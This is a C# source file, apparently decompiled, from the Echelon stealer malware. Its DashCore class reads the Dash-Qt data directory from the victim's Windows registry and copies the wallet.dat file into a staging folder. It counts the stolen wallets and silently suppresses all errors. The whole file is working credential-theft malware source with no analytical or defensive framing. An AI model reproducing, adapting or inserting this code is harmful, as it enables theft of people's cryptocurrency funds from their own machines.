using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000C RID: 12
	internal class DashCore
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00019994 File Offset: 0x00017B94
		public static void DSHcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
						DashCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003A RID: 58
		public static int count;
	}
}
